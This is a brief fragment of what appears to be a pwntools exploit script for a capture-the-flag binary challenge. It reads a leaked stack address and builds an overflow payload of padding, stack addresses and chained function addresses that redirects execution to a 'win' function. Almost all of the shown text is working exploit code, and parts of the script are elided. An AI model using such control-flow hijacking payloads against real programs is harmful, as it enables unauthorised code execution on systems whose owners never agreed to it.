...
# Beginnign of user input buffer.
p.recvuntil("At ")
...
payload = padA + p64(valid_stackAddr2) + p64(func5_valid) + p64(valid_stackAddr) + p64(func4_valid) + p64(valid_stackAddr3) + p64(func4_valid) + b'F' * 32 + p64(valid_stackAddr5) + p64(func3_valid) + b'G' * 8 + p64(func2_valid) + b'H' * 8 + p64(ret) + p64(win)
